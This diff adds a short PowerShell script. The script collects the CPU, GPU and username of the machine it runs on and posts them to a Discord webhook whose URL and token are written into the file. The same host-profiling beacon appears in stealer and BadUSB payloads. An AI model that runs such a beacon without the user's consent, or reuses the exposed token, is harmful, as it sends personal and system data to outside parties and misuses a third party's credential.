@@ -1,0 +1,31 @@
+# Retrieve CPU information
+$cpu = Get-WmiObject -Class Win32_Processor | Select-Object -Property Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors
+
+# Retrieve GPU information
+$gpu = Get-WmiObject -Class Win32_VideoController | Select-Object -Property Name, AdapterRAM, DriverVersion
+
+sleep 2
+
+# Define the Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1261718654404264047/tiKsgbRCU9pIK4P3LVewvcZLmoMd367n9C4gII7QP5yUaouJ7aMWr1iqHr3vcGf2Rd37"
+
+# Define the message payload
+$payload = @{
+    content = @"
+================================
+**$env:USERNAME** system online
+
+**GPU:** $($gpu.Name)
+**CPU:** $($cpu.Name)
+**CPU Cores:** $($cpu.NumberOfCores)
+================================
+"@
+} | ConvertTo-Json
+
+# Send the POST request to the webhook URL
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+    Write-Output "Message sent successfully."
+} catch {
+    Write-Output "Failed to send message. Error: $_"
+}
